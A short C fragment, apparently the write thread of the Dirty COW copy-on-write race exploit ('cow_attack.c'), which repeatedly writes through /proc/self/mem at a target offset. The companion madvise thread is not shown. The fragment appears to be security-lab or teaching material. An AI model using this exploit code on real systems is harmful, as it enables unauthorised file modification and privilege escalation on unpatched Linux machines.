/* cow_attack.c (the write thread) */
void *writeThread(void *arg){
 char *content= "******";
 off_t offset = (off_t) arg;
 int f=open("/proc/self/mem", O_RDWR);
 while(1) {
 // Move the file pointer to the corresponding position.
 lseek(f, offset, SEEK_SET);
 // Write to the memory.
 write(f, content, strlen(content));
 }
}